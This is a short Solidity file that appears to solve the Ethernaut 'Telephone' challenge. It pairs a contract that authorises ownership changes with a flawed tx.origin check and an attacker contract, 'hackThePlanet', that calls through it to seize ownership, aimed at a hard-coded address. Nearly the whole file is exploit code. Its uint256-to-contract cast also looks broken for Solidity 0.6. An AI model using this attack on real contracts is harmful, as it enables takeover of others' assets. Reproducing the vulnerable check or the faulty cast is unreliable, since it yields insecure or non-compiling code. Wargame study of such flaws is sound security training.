//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract hackThePlanet{
    Telephone public tphone;
    constructor(uint256 telephoneAddr) public{
        //0xe8C0a5487C8F8EA705259E3D1C87AB471Af08378
        tphone = Telephone(telephoneAddr);
        tphone.changeOwner(tx.origin);
    }
}
